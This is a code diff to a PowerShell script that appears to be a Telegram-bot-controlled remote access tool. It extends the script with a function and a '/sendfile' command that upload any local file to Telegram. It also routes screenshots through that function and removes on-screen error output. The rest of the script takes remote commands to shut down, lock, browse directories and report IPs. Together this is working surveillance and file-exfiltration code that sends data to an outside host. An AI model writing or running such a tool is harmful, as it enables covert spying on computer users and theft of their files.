@@ -27,6 +27,46 @@ function Send-TelegramMessage {
     } | ConvertTo-Json -Depth 10)
 }
 
+function Send-TelegramFile {
+    param (
+        [string]$chatId,
+        [string]$filePath
+    )
+
+    if (-not (Test-Path $filePath)) {
+        return "File not found: $filePath"
+    }
+
+    try {
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+        $fileName = [System.IO.Path]::GetFileName($filePath)
+
+        $content = (
+            "--$boundary`r`n" +
+            "Content-Disposition: form-data; name=`"chat_id`"`r`n`r`n$chatId`r`n" +
+            "--$boundary`r`n" +
+            "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"`r`n" +
+            "Content-Type: application/octet-stream`r`n`r`n"
+        )
+
+        $footer = "`r`n--$boundary--`r`n"
+
+        $contentBytes = [System.Text.Encoding]::UTF8.GetBytes($content)
+        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($footer)
+
+        $bodyBytes = New-Object byte[] ($contentBytes.Length + $fileBytes.Length + $footerBytes.Length)
+        [System.Buffer]::BlockCopy($contentBytes, 0, $bodyBytes, 0, $contentBytes.Length)
+        [System.Buffer]::BlockCopy($fileBytes, 0, $bodyBytes, $contentBytes.Length, $fileBytes.Length)
+        [System.Buffer]::BlockCopy($footerBytes, 0, $bodyBytes, $contentBytes.Length + $fileBytes.Length, $footerBytes.Length)
+
+        Invoke-RestMethod -Uri "$apiUrl/sendDocument" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
+        return "File sent: $filePath"
+    } catch {
+        return "Error sending file: $_"
+    }
+}
+
 function Get-LocalIP {
     $ipInfo = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.PrefixLength -eq 24}
     return $ipInfo.IPAddress -join ' '
@@ -42,9 +82,7 @@ function Get-PublicIP {
 }
 
 function Send-Screenshot {
-    param (
-        [string]$chatId
-    )
+    param ([string]$chatId)
     try {
         $screenshotPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
         Add-Type -AssemblyName System.Windows.Forms
@@ -57,8 +95,7 @@ function Send-Screenshot {
         $graphics.Dispose()
         $bitmap.Dispose()
 
-        $form = @{ chat_id = $chatId; photo = Get-Item $screenshotPath }
-        Invoke-RestMethod -Uri "$apiUrl/sendPhoto" -Method Post -Form $form
+        Send-TelegramFile -chatId $chatId -filePath $screenshotPath
         Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
         return $true
     } catch {
@@ -76,14 +113,15 @@ function Send-HelpMessage {
 Available Commands:
 
 /help - Displays this help message.
-/open_notepad - Opens Notepad.
+/notepad - Opens Notepad.
 /visit <url> - Opens a URL in the browser.
 /lock - Locks workstation.
 /restart - Restarts the computer.
 /shutdown - Shuts down the computer.
-/get_ip - Shows local and public IP.
+/ip - Shows local and public IP.
 /screenshot - Sends a screenshot.
-/get_pcname - Shows the computer name.
+/pcname - Shows the computer name.
+/sendfile <path> - Sends a file from local disk.
 cd <path> - Change directory.
 cd - Show current directory.
 ls or dir - List files and folders.
@@ -157,11 +195,11 @@ while ($true) {
                 $publicIP = Get-PublicIP
                 $reply = "Local IP: $localIP`nPublic IP: $publicIP"
             }
-            elseif ($text -eq "/get_pcname") {
+            elseif ($text -eq "/pcname") {
                 $pcName = Get-PCName
                 $reply = "Computer Name: $pcName"
             }
-            elseif ($text -eq "/open_notepad") {
+            elseif ($text -eq "/notepad") {
                 Start-Process notepad.exe
                 $reply = "Notepad opened."
             }
@@ -186,11 +224,14 @@ while ($true) {
                 $reply = "Taking screenshot..."
                 Send-TelegramMessage -chatId $chatId -message $reply
                 $success = Send-Screenshot -chatId $chatId
-                if ($success) {
-                    $reply = "Screenshot sent."
-                } else {
-                    $reply = "Failed to capture screenshot."
+                $reply = if ($success) { "Screenshot sent." } else { "Failed to capture screenshot." }
+            }
+            elseif ($text -match "^/sendfile\s+(.+)$") {
+                $filePath = $matches[1].Trim('"')
+                if (-not [System.IO.Path]::IsPathRooted($filePath)) {
+                    $filePath = Join-Path $global:CurrentDirectory $filePath
                 }
+                $reply = Send-TelegramFile -chatId $chatId -filePath $filePath
             }
             else {
                 $reply = "Unknown command."
@@ -200,7 +241,6 @@ while ($true) {
         }
         Start-Sleep -Seconds 2
     } catch {
-        Write-Host "Error: $_"
         Start-Sleep -Seconds 5
     }
 }
